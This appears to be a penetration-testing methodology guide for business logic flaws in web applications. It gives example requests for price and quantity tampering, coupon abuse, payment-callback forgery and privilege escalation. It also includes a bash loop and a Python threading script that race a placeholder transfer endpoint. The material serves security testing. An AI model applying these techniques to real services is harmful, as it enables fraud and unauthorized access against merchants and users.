# Business Logic Vulnerability Testing Methodology

## Quick Reference

**Key Areas:**
- Price manipulation
- Quantity manipulation
- Coupon/discount abuse
- Race conditions
- Workflow bypass
- Access control gaps

---

## Business Logic vs Technical Vulnerabilities

Business logic flaws exploit the **intended functionality** in unintended ways:
- No injection or technical exploit
- Abuse of legitimate features
- Often unique to the application

---

## Price and Payment Manipulation

### Price Modification

```
# Intercept checkout request
POST /api/checkout
{
  "item_id": 123,
  "price": 99.99  → "price": 0.01
}
```

### Negative Values

```
# Negative quantity
{"quantity": -5, "price": 100}  → Refund/credit

# Negative price
{"quantity": 1, "price": -100}  → Credit applied
```

### Integer Overflow

```
# Large quantity causing overflow
{"quantity": 2147483647}
{"quantity": 4294967295}
```

### Currency Manipulation

```
# Change currency in request
{"amount": 100, "currency": "USD"} → {"amount": 100, "currency": "JPY"}
```

### Decimal Precision

```
# Rounding errors
{"price": 0.009}  → May round to 0.01 or 0.00
```

---

## Coupon and Discount Abuse

### Code Reuse

- Use coupon multiple times
- Share single-use codes between accounts

### Multiple Coupons

- Apply multiple discount codes
- Stack percentage + fixed amount

### Coupon Code Discovery

```
# Sequential codes
PROMO001, PROMO002, PROMO003

# Predictable patterns
SUMMER2024, FALL2024, WINTER2024

# Brute force short codes
AAAA-ZZZZ
```

### Race Condition Exploitation

```
# Send multiple requests simultaneously
for i in {1..10}; do
  curl -X POST /api/apply-coupon -d '{"code": "50OFF"}' &
done
```

### Referral Abuse

- Self-referral
- Fake account referrals
- Referral code enumeration

---

## Race Conditions

### TOCTOU (Time-of-Check-Time-of-Use)

```
# Balance check → Withdraw
# Send multiple withdraw requests simultaneously
Thread 1: Check balance ($100) → Approve → Withdraw $100
Thread 2: Check balance ($100) → Approve → Withdraw $100
# Result: $200 withdrawn from $100 balance
```

### Testing Methodology

```python
import threading
import requests

def make_request():
    requests.post("https://target.com/api/transfer",
                  json={"amount": 100})

threads = []
for i in range(20):
    t = threading.Thread(target=make_request)
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()
```

### Common Race Condition Targets

- Money transfers
- Coupon redemption
- Inventory purchases
- Like/vote counters
- Account creation (duplicate usernames)

---

## Workflow Bypass

### Step Skipping

```
# Normal flow: Step1 → Step2 → Step3 → Complete
# Try: Step1 → Complete
# Try: Step1 → Step3 → Complete
```

### State Manipulation

```
# Intercept and modify order state
{"order_id": 123, "status": "pending"} → {"status": "completed"}
```

### Payment Bypass

```
# Skip payment step
1. Add to cart
2. Proceed to checkout
3. Skip payment page
4. Access order confirmation directly

# Payment callback manipulation
POST /payment/callback
{"status": "success", "order_id": 123}  # Forge success
```

---

## Access Control Issues

### Horizontal Privilege Escalation

```
# Access other user's resources
/api/users/123/orders → /api/users/456/orders
```

### Vertical Privilege Escalation

```
# Regular user accessing admin functions
POST /api/admin/users
{"role": "admin", "user_id": 123}
```

### Function-Level Access Control

```
# Check all API endpoints for authorization
/api/admin/users         # Should require admin
/api/internal/reports    # Should be internal only
/api/debug/logs          # Should be disabled
```

---

## Parameter Tampering

### Hidden Fields

```html
<input type="hidden" name="user_id" value="123">
<input type="hidden" name="is_admin" value="false">
```

Change via intercepting proxy or browser dev tools.

### Client-Side Validation Bypass

```javascript
// Client validates max 100
if (quantity > 100) { alert("Max 100"); return; }

// Bypass by intercepting request
POST /api/order
{"quantity": 1000}  # Server may not validate
```

### Mass Assignment

```
# Add unexpected parameters
POST /api/user/update
{
  "name": "John",
  "email": "john@example.com",
  "role": "admin",           # Added
  "account_balance": 10000   # Added
}
```

---

## Transaction and Inventory Issues

### Insufficient Balance Handling

```
# Transfer more than balance
{"from": "user1", "to": "user2", "amount": 1000000}
```

### Double Spending

```
# Spend same credits twice via race condition
Thread 1: Buy item A ($100)
Thread 2: Buy item B ($100)
# Both succeed with only $100 balance
```

### Inventory Manipulation

```
# Buy more than available stock
{"item_id": 123, "quantity": 1000}  # Only 10 in stock
```

---

## Trust Relationship Abuse

### User-Supplied Data Trust

```
# Server trusts client-provided data
{"total": 0.00}  # Client sends calculated total
{"shipping": "free"}  # Client specifies shipping
```

### Third-Party Integration Abuse

```
# Manipulate callback from payment processor
# Forge webhooks
# Replay legitimate callbacks
```

---

## Time-Based Vulnerabilities

### Expired Data Use

- Use expired coupons
- Access time-limited content after expiry
- Complete transactions after timeout

### Timezone Manipulation

```
# Abuse timezone differences
{"timestamp": "2024-01-01T00:00:00Z"}
{"timestamp": "2024-01-01T00:00:00-12:00"}
```

### Deadline Bypass

```
# Submit after deadline by manipulating timestamp
# Complete multi-step process across midnight
```

---

## Enumeration and Data Mining

### Information Disclosure via Error Messages

```
# Try invalid values to expose information
{"user_id": "invalid"} → "User 'invalid' not found in database 'users'"
```

### Sequential ID Enumeration

```
/api/orders/1
/api/orders/2
/api/orders/3
...
```

### Username Enumeration

```
# Different responses for valid/invalid users
"Invalid password" vs "User not found"
```

---

## Testing Approach

### 1. Understand the Business Flow

- Map all workflows
- Identify valuable actions (payments, transfers)
- Note validation points

### 2. Identify Trust Boundaries

- What data comes from client?
- What's validated server-side?
- Where are authorization checks?

### 3. Test Edge Cases

- Zero values
- Negative values
- Maximum values
- Boundary conditions

### 4. Test Concurrency

- Simultaneous requests
- Race conditions
- State consistency

### 5. Test Workflow Variations

- Skip steps
- Repeat steps
- Reverse order
- Partial completion

---

## Verification Checklist

1. **Map business workflows:**
   - [ ] Document normal flow
   - [ ] Identify valuable actions

2. **Test price/quantity manipulation:**
   - [ ] Negative values
   - [ ] Zero values
   - [ ] Large values

3. **Test workflow bypass:**
   - [ ] Skip steps
   - [ ] Direct access to final step

4. **Test race conditions:**
   - [ ] Concurrent requests
   - [ ] Double spending

5. **Test access control:**
   - [ ] Horizontal access
   - [ ] Vertical access
   - [ ] Function-level

6. **Document evidence:**
   - [ ] Working exploit
   - [ ] Business impact
   - [ ] Reproduction steps
